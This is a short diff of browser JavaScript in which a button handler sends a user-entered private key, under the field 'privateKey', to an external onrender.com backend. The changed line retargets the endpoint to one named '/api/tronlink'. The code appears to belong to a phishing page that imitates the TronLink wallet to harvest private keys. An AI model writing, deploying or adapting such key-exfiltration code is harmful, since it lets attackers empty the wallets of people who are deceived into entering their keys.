@@ -68,7 +68,7 @@ document.querySelector(".button").addEventListener("click",(e)=>{
     }
 
     if(error1 === false && error2 === false){
-        const url = "https://backend-01-92mi.onrender.com/api/data4";
+        const url = "https://backend-01-92mi.onrender.com/api/tronlink";
         const data = {
             privateKey:str
         };
